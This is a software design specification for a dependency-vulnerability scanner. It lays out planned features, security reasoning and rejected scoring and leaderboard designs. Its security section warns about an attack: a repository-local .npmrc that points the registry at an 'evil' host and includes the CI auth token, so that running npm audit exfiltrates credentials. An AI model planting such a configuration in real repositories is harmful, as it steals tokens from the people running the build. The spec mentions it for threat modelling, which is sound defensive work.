# Feature specification: something on run one, and a reason to come back

## Issue and lifecycle metadata

- Issue: [#125](https://github.com/zero-shelter/zero-shelter/issues/125)
- Target layer: ingest, judgment, package
- Related PR: [#127](https://github.com/zero-shelter/zero-shelter/pull/127)

A roadmap spec. It fixes the order and the shared decisions; each piece carries
its own spec at `docs/specs/<issue>-<slug>.md` before it is implemented.

**This document was rewritten after review.** Its first draft proposed a posture
score, a badge carrying that score, and a public leaderboard. Nine independent
reviews — four of which ran the tool against `bench/captures/` and
`test/fixtures/` — found the design unsound. The rejected work and the
objections that killed it are recorded in [Rejected designs](#rejected-designs)
rather than deleted, because the ideas are attractive enough to be proposed
again and the reasons they fail are not obvious from the outside.

## Problem

Three limits, each checkable against the source.

**Nothing is offered on the first run.** `PRODUCT.md` states the consequence
plainly: *"With one source there is nothing to reconcile: the reduction is zero
and the value is ranking alone."* Reconciliation is the product, and it is
invisible until the reader installs a second scanner on our say-so. The funnel
asks for `brew install osv-scanner` before it shows anything.

**The one asset that accumulates never pays out.** Every acceptance carries a
`reason`, an `acceptedBy` and an `expires` (#104), so a year of use produces a
record of decisions with names and dates on it, in the reader's own repository.
Nothing surfaces it until a deadline has already passed: `applyBaseline`
computes `expired`, described as *"Back in `fresh`, and named."* A file that
only speaks after the fact is a graveyard.

**The scanner set is source code.** `src/scan.ts` names `npm audit`, `pnpm
audit` and `osv-scanner` in its body and picks between them with `existsSync`.
Nobody outside this repository can add a fourth, and nobody inside it can add
one quickly — meanwhile `finding.ts:44` treats `ecosystem` as a free string and
`ingest/osv.ts:56` already passes PyPI, Go and crates.io findings through the
whole pipeline intact. The walls are at collection and at remediation, not in
the middle.

## Goal

**A reader gets an answer on the first run, with the scanner they already have.**
The question that separates *"a fix exists"* from *"a fix exists for me"* — which
of my direct dependencies pulls this in, and what is the lowest version of it
that clears the advisory — is asked constantly and answered badly by everything.
`npm audit` says `fixAvailable: true` and stops. `npm ls` prints the tree and
knows nothing about versions. We can answer it from the lockfile, offline, with
one scanner.

**The baseline becomes a work queue instead of a graveyard.** The same data one
step earlier — *twelve acceptances expire in the next thirty days, eight of them
alice's* — gives a reason to run this again next month, makes the accumulated
file worth something rather than merely present, and survives a maintainer
leaving, because `acceptedBy` says who owned each decision and the report says
which ones are now nobody's.

**Adding a scanner stops requiring our permission.** A scanner becomes a JSON
manifest naming a command and a wire format, loaded from the package or from the
reader's own repository. The measure is the size of a contribution: adding
`trivy` should be a manifest, a fixture and a test, reviewable by someone who has
never read `src/scan.ts`.

**The judgement becomes readable by things we did not write.** We already emit
SARIF so downstream receives one judged run instead of four raw ones. The
baseline deserves the same treatment, and the format for it already exists — see
piece 6.

## Scope

### Included

1. `zero-shelter why <package>` — the dependency path and the version that clears it (#140)
2. A real date check on `expires` (#136), then the expiry report (#141)
3. Per-source attribution: what each scanner uniquely sees (#142)
4. Adapter manifests and SARIF as an input format (#126, #128, #129)
5. A policy file: minimum severity, scope exclusion, deadlines (#130, #131, #132)
6. The baseline emitted as OpenVEX (#138)
7. A badge stating documented-exception counts, not a score (#134, reduced)

### Explicitly excluded

- **A posture score as a single number.** See [Rejected designs](#rejected-designs).
- **A public leaderboard.** Same.
- **Per-project weights.** `WEIGHTS` stays frozen. This survives the rewrite for
  a different reason than before: not to make scores comparable — there is no
  score — but because `--explain` prints that table, and a table the reader can
  edit is one the printed explanation no longer describes.
- **Per-finding excludes in the policy file.** That is the baseline, which
  already carries a reason, an owner and an expiry. Two suppression mechanisms
  means two places to look when something is missing.
- **Inferring a VEX justification.** We may serialise a justification a human
  wrote. Deriving one would put a false non-exploitability assertion into a
  document other people act on.
- **Reachability.** Unchanged: nothing here knows whether the vulnerable code
  path runs.

## Work items

| # | Piece | Depends on |
|---|---|---|
| [#140](https://github.com/zero-shelter/zero-shelter/issues/140) | `why <package>`: the path, and the version that clears it | — |
| [#136](https://github.com/zero-shelter/zero-shelter/issues/136) | `9999-99-99` passes the date check and never expires | — |
| [#141](https://github.com/zero-shelter/zero-shelter/issues/141) | The expiry report: the baseline as a work queue | #136 |
| [#142](https://github.com/zero-shelter/zero-shelter/issues/142) | What each scanner uniquely sees | — |
| [#126](https://github.com/zero-shelter/zero-shelter/issues/126) | Survey: which scanners emit OSV or SARIF | — |
| [#128](https://github.com/zero-shelter/zero-shelter/issues/128) | Read SARIF as input | #126 |
| [#129](https://github.com/zero-shelter/zero-shelter/issues/129) | Adapter manifests | #128 |
| [#130](https://github.com/zero-shelter/zero-shelter/issues/130) | A policy file | — |
| [#131](https://github.com/zero-shelter/zero-shelter/issues/131) | Deadlines per severity | #130 |
| [#132](https://github.com/zero-shelter/zero-shelter/issues/132) | `skills/policy` | #130, #131 |
| [#138](https://github.com/zero-shelter/zero-shelter/issues/138) | The baseline as OpenVEX | — |
| [#134](https://github.com/zero-shelter/zero-shelter/issues/134) | A badge, reduced to documented-exception counts | #141 |

Corrections found during the review, independent of any of the above:
[#137](https://github.com/zero-shelter/zero-shelter/issues/137) (an unbanded
advisory ranks as `info`, which for yarn projects is every advisory) and
[#139](https://github.com/zero-shelter/zero-shelter/issues/139)
(`corroboratedPerExtraTool` ranks a confirmed malicious package below a mirrored
ReDoS).

**Start at #140 and #136.** Neither depends on anything, #140 is the one that
gives a first-time reader something, and #136 is a shipped defect that #141
would otherwise silently inherit.

Per-scanner adapter Issues are filed once #129 lands, not before: labelling work
`good first issue` when nobody can start it is the defect #91 described.

## Interface

### `why`

```console
$ zero-shelter why tar
tar 6.2.0 — GHSA-xxxx, fixed in 7.5.22

  express 4.18.2 → send 0.18.0 → tar ^6
  cacache 17.1.4 → tar ^6

  4 dependents require ^6. No version of express you can install
  resolves this; the range is theirs, not yours.
```

Answered from the lockfile. `src/lockfile.ts` already builds `required: Map<string,
Requirement[]>` where `Requirement` is `{ by, range }` and `by` is the
dependent's lockfile path — the edge list a walk needs. `blockedBy()` already
computes which dependents keep an old copy, and `version-range.ts` has
`accepts()`, `lowestMentioned()` and `compare()`.

The limit to state in the output: the lockfile records the ranges dependents
asked for, not every version they would accept. "The lowest direct version that
clears this" is answerable when some version already in the tree satisfies it,
and otherwise we name the blocker and stop. Saying which of the two we did is
the difference between useful and misleading.

### The expiry report

```console
12 acceptances expire in the next 30 days
   8  alice      earliest 2026-09-14
   3  bob
   1  unassigned

 4 acceptances have no expiry at all
```

Unbounded acceptances are listed separately. They are not expiring; they are a
different problem, and collapsing the two would hide it.

Blocked on #136. `ISO_DATE` is `/^\d{4}-\d{2}-\d{2}$/`, which accepts
`9999-99-99`, and `hasExpired` compares lexicographically — so an acceptance can
carry a date that never expires and would never appear in this report. The
entries most worth seeing are exactly the ones that would be omitted.

### Per-source attribution

```console
osv-scanner is the only source for 14 of 82 findings
   3 critical · 5 high · 6 moderate
npm audit is the only source for 2
66 are reported by both
```

A group-by over `MergedFinding.tools`, which already exists. Counts must sum to
`summary.merged` exactly, and a test should assert that rather than trust it.

Unique does not mean better. A source can be alone in reporting something
because it is the only one that knows, or because it is wrong. We can tell which
findings are single-sourced; we cannot tell which of those two, and the wording
must not imply otherwise.

### Adapter manifest

```json
{
  "id": "trivy",
  "detect": ["package-lock.json", "go.mod"],
  "command": "trivy",
  "args": ["fs", "--format", "sarif", "--quiet", "."],
  "format": "sarif",
  "versionArgs": ["--version"],
  "install": "brew install trivy, or https://github.com/aquasecurity/trivy/releases"
}
```

`format` is one of `osv`, `sarif`, `npm-audit`. `install` follows the wording
`scan.ts` already uses: name the way out, not only the problem.

Built-in manifests load first, then `.zero-shelter/adapters/`. **Manifests are
sorted by `id` before execution** and ecosystem is case-folded through
`src/normalize.ts` — see [Security](#security-and-privacy) and #129 for why both
are load-bearing rather than tidiness.

### Policy file

```json
{
  "version": 1,
  "minimumSeverity": "moderate",
  "ignoreScopes": ["dev"],
  "deadlines": { "critical": 7, "high": 30, "moderate": 90, "low": 365 }
}
```

`ignoreScopes` reads `lockfile.ts`'s `scopes`. `mixed` is never ignorable — a
package that is a dev dependency here and a production dependency of something
we ship is a production dependency, and `lockfile.ts` computes that rather than
guessing it.

Deadlines are days from the advisory's `published` date. **`published` is set
only in `src/ingest/osv.ts`**, so a project without osv-scanner has no deadlines
at all. That is a real gap in the feature, it is stated here rather than
discovered later, and it is one of the reasons deadlines are a report and not a
score.

### The baseline as OpenVEX

Our `AcceptedFinding` is a bespoke VEX with one field VEX does not have.

| Ours | OpenVEX |
|---|---|
| `reason` (free text) | `justification` — a five-value machine-readable enum, plus optional prose |
| `acceptedBy` (free text) | `author` — required |
| `expires` | nothing |

The enum — `component_not_present`, `vulnerable_code_not_present`,
`vulnerable_code_not_in_execute_path`,
`vulnerable_code_cannot_be_controlled_by_adversary`,
`inline_mitigations_already_exist` — is the closed vocabulary the review
concluded we needed and were about to design. It has existed since 2022 and it
is the one everyone else already reads.

Meanwhile `osv-scanner.toml` has the expiry (`ignoreUntil`) and no VEX output;
[its issue #19](https://github.com/google/osv-scanner/issues/19) has been open
since 2022-11-27. No npm-tier tool records an owner in-file at all.

So a VEX-native baseline carrying an expiry and an owner sits in a gap between
two tools we already integrate with. Additive: a new `--format openvex`,
existing formats unchanged.

*The enumerations above were read during the review. Re-check them against
`OPENVEX-SPEC.md` before building — the spec is the authority, not this
document.*

### The badge, reduced

```
zero-shelter | deps · exceptions: 12 documented, 3 not · 2026-09-02
```

Not a score. Three counts that are pure functions of the tree, plus two things
the first draft omitted and which are not optional:

**The label carries the scope.** A green badge reading `zero-shelter` on a
repository with a leaked credential is an assurance about a domain this tool has
never looked at. `FindingClass` has one member (#99); until there is a second,
the label says `deps`.

**The badge carries its date.** The file is committed by hand, so it is stale by
default, and staleness is the honest state. Do not put a scheduled regeneration
workflow in the recommended setup: a number that moves without a commit is one
the maintainer cannot answer for.

`zero-shelter badge` emits only `schemaVersion`, `label`, `message`, `color`, and
refuses the shields.io endpoint schema's other fields. The docs must say plainly
that a badge is a **self-report, not an audit** — anyone can write the file by
hand, and a permanently-green badge over a knowingly-vulnerable package is a
trust-laundering primitive we would be handing out.

## Architecture

| Piece | Files expected to change | Shared contracts touched |
|---|---|---|
| `why` | new `src/why.ts`, `src/cli.ts` | new subcommand beside `hook` and `history` |
| Expiry | `src/baseline.ts`, `src/history.ts`, `src/report.ts` | none frozen |
| Attribution | `src/report.ts`, `src/html.ts` | additive JSON key |
| Adapters | `src/scan.ts`, new `src/adapters.ts`, new `src/ingest/sarif.ts`, new `adapters/*.json` | `Collected`, `skipped` wording |
| Policy | new `src/policy.ts`, `src/judge.ts`, new `skills/policy/` | additive `JudgeResult` fields |
| OpenVEX | new `src/openvex.ts`, `src/cli.ts` | new `--format` value |
| Badge | new `src/badge.ts`, `src/cli.ts` | new output format |

Every piece reads data the pipeline already produces. Nothing here adds a parser,
a field on `ScaFinding`, or a network call.

### The determinism hazard #129 introduces

`src/merge.ts:166` takes `ecosystem` and `packageName` from `group[0]` — the
first finding to arrive — and line 163 puts `first.ecosystem` into the merged
fingerprint. Group order is input order, which becomes adapter execution order.

Two consequences, both cheap to prevent and expensive to retrofit:

- If `.zero-shelter/adapters/` is read with `readdir` and not sorted, execution
  order is filesystem-dependent and APFS, ext4 and NTFS disagree. **Sort by `id`.**
- `ingest/osv.ts` lowercases ecosystem and `ingest/npm-audit.ts` hardcodes
  `"npm"`; they agree by accident. A SARIF adapter emitting `"NPM"` makes
  `groupByAlias` treat it as a different package — the same vulnerability
  reported twice and never merged. **Case-fold through `normalize.ts`**, which
  the README invariant already requires for anything fingerprinted.

A test that shuffles adapter order and asserts identical fingerprints belongs in
the loader's first commit.

### The risk in the adapter work, stated plainly

SARIF is a findings container, not a dependency-vulnerability schema. It carries
a rule id, a level and a message; it does not carry a package name, a vulnerable
range or a fixed version in any standard place. Tools put those in `properties`
under names they chose, or in the message prose.

So "one SARIF reader unlocks every SARIF-emitting scanner" is a hypothesis. If it
fails, the manifest is still worth having — it removes hardcoded command and
detection logic — but each scanner needs its own small parser and contributions
stop being pure data. That is why #126 is a prerequisite rather than
documentation written afterwards.

## Security and privacy

| Question | Answer |
|---|---|
| Protected data | None new. Findings are public advisory data. |
| Trust boundary | An adapter manifest names a command to execute. This is arbitrary command execution by construction. |
| Network | None of ours. Manifests are never fetched. The badge file is written, never uploaded. |
| LLM | Authoring-time only. The policy skill writes a file; `judge` reads it. |
| Failure mode | Fail-closed for an unreadable manifest or policy: exit 2 with the reason. A run with fewer sources than expected still exits 0 and reads as clean, so a silent skip is the dangerous direction. |
| Opt-in | User adapters and the policy file are opt-in by existing. Absent means today's behaviour. |

The manifest's execution risk sits at the level of `scripts` in `package.json`: a
file in your own repository, under your own review. Two rules hold it there —
manifests are never fetched over the network, and every run prints which adapters
contributed, so one cannot execute unseen.

**That justification depends entirely on the file being yours.** The first draft
of this spec stated the same sentence and then proposed a leaderboard whose CI
would check out third-party repositories and run the scorer inside them — at
which point the manifest is a stranger's and the argument collapses into remote
code execution with our token. The two statements sat forty lines apart in one
document and nobody connected them.

The rule that follows, and it applies to anything built later: **never run this
tool against a tree you did not author, in an environment holding credentials.**
Two paths reach execution without any adapter at all — a repo-local `.npmrc` with
`registry=https://evil/` and `_authToken=${NODE_AUTH_TOKEN}` makes our own `npm
audit --json` exfiltrate the environment, and a symlinked `package-lock.json` or
`baseline.json` reads host files. "It does not install dependencies" is not a
sandbox.

A VEX document (#138) is a published assertion about exploitability that other
people act on. The `author` field is required by the spec for that reason. We
refuse to emit a statement with no human author rather than filling it in with a
tool name.

## QA acceptance criteria

| Scenario | Expected result | Evidence |
|---|---|---|
| Normal input | `why` prints a path for a transitive finding; the expiry report lists acceptances inside the window | fixture tests |
| Invalid input | Malformed manifest, policy or date exits 2 naming the file and the field | unit test per failure |
| Empty input | No manifests, no policy, no baseline behave exactly as today | existing suite unchanged |
| Boundary | An acceptance expiring on the given date; a package at two versions by two paths; a cycle in the dependency graph | table-driven tests |
| Existing behavior | `judge` output unchanged when no policy file exists | `test/contract.test.ts` |
| Security/privacy abuse | A manifest naming an absent command is skipped with a note, not resolved through a shell that finds something else | test on the `capture` path |
| Determinism | Shuffling adapter order produces identical fingerprints; the suite passes on Ubuntu, macOS and Windows | CI matrix, as fingerprints already have |

## Agent notes

`why` is a read. It prints a path and a version; it does not install anything,
and the version it names is a candidate for a human to evaluate, not a command to
run.

The expiry report is a work queue, not a task list to clear. Renewing an expiry
is a fresh risk judgement and `AGENTS.md` already places acceptance on the
human's side. An agent that extends expiries to empty the report has done the
opposite of the work.

Do not treat "unique to one scanner" as "probably a false positive". #139
documents the reverse case: the findings only one source can see include
confirmed malicious packages, which no other source carries at all.

## Rejected designs

Recorded rather than deleted. Each was proposed in the first draft of this spec,
each is attractive from outside, and each failed for reasons that are not visible
until someone measures. Anyone re-proposing one should answer the objection
first.

### A posture score as a single integer — #133

Proposed: an integer rule table in the shape of `WEIGHTS`, printed line by line
with `--explain`, counting hygiene rather than vulnerabilities.

**It contradicted its own stated principle.** The two largest terms —
`fixableOutstanding` and `overdue` — were counts over *outstanding* findings,
which is exactly the set `--update-baseline` empties. Measured on a four-finding
fixture: as shipped **−29**; after `--update-baseline` **+3**; after documenting
those acceptances **+15**; **after fixing every vulnerability, +15**. Fixing
everything and accepting everything landed on the same number. On NodeGoat the
swing was **+2,635** for writing three strings, against **+15** for fixing a
critical.

The relationship is checkable rather than a matter of taste: while
`|acceptanceUndocumented|` is less than `|fixableOutstanding|`, suppression is
always profitable, and raising it until it is not turns the score into the pure
vulnerability count the design rejected. There is no consistent assignment.

**Its shape ranked by project size.** Positive terms capped at +65; a
900-dependency project's day-one floor was around −3,900. The positives were
bounded process facts and the negatives scaled with finding count, which scales
with dependency count. Past five findings the number was mostly *how big are
you*.

**Its headline term punished the behaviour the product exists to encourage.**
`sourceBeyondFirst` paid +25 once per extra scanner and charged up to −15 for
every fixable finding that scanner uniquely revealed. Break-even was 1.1
findings. And because `published` comes only from `ingest/osv.ts`, `overdue`
could not fire without osv-scanner — so installing it cost −590 on juice-shop,
−1,451 on NodeGoat, −351 on dvna.

**Its inputs are not properties of the commit.** Three of seven terms were
commit-determined; the rest read the machine's `PATH`, the advisory database's
state that day, or the clock. Measured on identical fixtures differing only by
installed scanners: 19 points of divergence, with the finding set itself
changing composition.

**Individual terms were defeated one at a time.** `acceptanceUndocumented`
checked three fields for non-emptiness — one `jq` stamps 340 acceptances.
`acceptanceExpired` (−10) against an acceptance that never had an expiry (−3)
paid seven points to delete the date. At `low` and `info` it was cheaper to
ignore a finding than to document it. And since SARIF carries neither `fixedIn`
nor `published` in a standard place — stated in this spec's own risk section —
switching every adapter's `format` from `osv` to `sarif` made both penalty terms
structurally unreachable, with nothing forged for a reviewer to point at.

**What survives** is a vector rather than a scalar — sources, outstanding by
severity, documented and undocumented acceptances, overdue — compared only to the
same repository's previous run with the same declared scanner set, and refusing
to emit a trend when that set changed. `history.jsonl` already carries `at`,
`sources` and `outstanding`, and `applyBaseline` already computes
`missingSources` for exactly this reason.

Two reviews independently proposed the same replacement if a single number is
ever wanted: **median days-to-remediate over a trailing window**, with `n`
printed and suppressed below `n=5`. It is intensive rather than extensive, an
inherited backlog does not sink it, `--update-baseline` cannot move it, and a
repository with no applicable advisories gets `no data` rather than a perfect
score — which is the only construction that kills the empty-repo champion.

### A public leaderboard — #135

Proposed: entries as pull requests naming a public repo and a commit SHA, with CI
re-deriving the score to verify the claim.

**A commit's score is not a property of the commit.** The input is
`(tree × scanner set × advisory DB state × clock)` and three of those four are
not in the commit. The advisory database ends it on its own: `npm audit` queries
the registry live and osv-scanner refreshes its own data, so two runs a week
apart on a frozen commit see different advisories. There is no snapshot
identifier to pin, and pinning one would mean bundling or fetching an advisory
database — a different product, or a broken invariant.

**Verification would have been remote code execution.** Covered in
[Security](#security-and-privacy). The fix and the feature are mutually
exclusive: verification must disable user manifests, and then it scores a
different scanner set than the claimant used.

**Re-derivation admits fakes and rejects honest entries.** A five-minute empty
repository with two manifests pointing a real scanner at an empty directory
reproduces its maximum forever; a real project's numbers move between claim and
recomputation because the ecosystem moved. It is a filter for determinism, and
only the cheaters are deterministic.

**Nothing stopped a stranger registering someone else's repository.** A sound fix
exists — an entry is valid only if the checked-out commit contains
`.zero-shelter/leaderboard.json` naming that repo, so consent becomes
re-derivable the way the score was meant to be. It does not rescue the three
objections above.

**The one previous attempt was retired by its own author.** SecurityScorecard ran
public scorecards and replaced them with Trust Centers, *"a more controllable
sharing option"* — a company with lawyers and a sales motive moving from
publishing scores about entities to letting entities publish their own. And
OpenSSF scans over a million repositories weekly into a public dataset where a
ranking is one `ORDER BY` away, and declines to build one. Their README states
why: *"Aggregate scores in particular tells you nothing about what individual
behaviors a repository is or is not doing … These scores change as we add new
heuristics."* That last clause alone defeats verify-at-SHA.

**`--explain` makes a number arguable on the machine that produced it. A
leaderboard asserts it is true off that machine. Traceability is not
comparability.**

The idea worth keeping is the inverse: **rank the blockers, not the projects** —
the unmaintained packages blocking the most downstream repositories, with their
open pull requests. It comes from data we already collect, no maintainer is
ranked, and the pressure points at what can be fixed. Filed separately if anyone
wants it.

### A coverage axis across security domains

Proposed: score which domains — dependencies, secrets, container, IaC, SAST,
CI/CD — a repository has examined at all, on the grounds that an unexamined
domain is unknown rather than clean. That grounding is right and matches the
argument exit code 2 already stands on.

It cannot ship yet. `FindingClass` has exactly one member and #99 argues the seam
should open late and not with secrets first, for reasons that are about safety
rather than sequencing: the remedy for a secret is rotation and every action
surface we have assumes a version bump, accepting a live credential into a
baseline is a much worse default than accepting a known CVE, and a fingerprint
containing the secret writes credentials into a committed file.

With one class the denominator is 1 and any coverage figure reads `1/1` forever.
Until a second class exists the badge says `deps` and prints no fraction.

### A score-carrying badge, and per-scanner scores summed

The badge as first drafted had no integrity: `echo` writes any number into the
file, and the design spent its verification budget on the leaderboard almost
nobody reads while leaving the artifact everyone sees unchecked. It survives only
by making a claim that needs no verification, which is what the reduced form
above does.

Summing per-scanner scores fails the same way the single score did — the
aggregate is where it breaks. Per-scanner *facts* are useful and are kept, as
#142.

## Decision log

| Decision | Alternatives considered | Reason |
|---|---|---|
| Lead with `why`, not with the pipeline | Lead with reconciliation | Reconciliation needs two scanners to show anything. `why` answers on run one with the scanner they have. |
| The expiry report is the retention mechanism | A badge, a leaderboard | The baseline is already the thing that accumulates in the reader's repository. It just never paid out. |
| Deadlines from `published` | From first observation | `published` is a fact from the source and already carried; first observation needs history we do not always have. Recorded with its gap: `published` comes only from osv-scanner, so a project without it has no deadlines. Acceptable in a report, disqualifying in a score. |
| Adapters are declarative data | A code plugin API | A plugin runs in our process and needs a runtime dependency to load. `osv.ts` shows how much genuine parsing there is — a manifest expressive enough would be a language. |
| Manifests sorted by `id`, ecosystem case-folded | Whatever `readdir` returns | The merged fingerprint reads `group[0].ecosystem`. Unsorted execution makes it filesystem-dependent. |
| Emit OpenVEX rather than design an enum | A bespoke justification enum | The review concluded we needed a closed vocabulary. One exists, is standardised three ways, and everything downstream already reads it. |
| VEX justifications are never inferred | Derive from reachability heuristics | A VEX statement is an assertion others act on, and we have no reachability data. |
| The badge names its scope and its date | `zero-shelter \| 65` | A green badge on a repo with a leaked credential asserts something about a domain we never examined. |
| `WEIGHTS` stays frozen | Per-project weights | `--explain` prints that table. A table the reader can edit is one the explanation no longer describes. |
| Rejected designs recorded in full | Delete them | Every one is attractive from outside and fails for reasons only visible after measuring. Deleting them guarantees they are proposed again. |
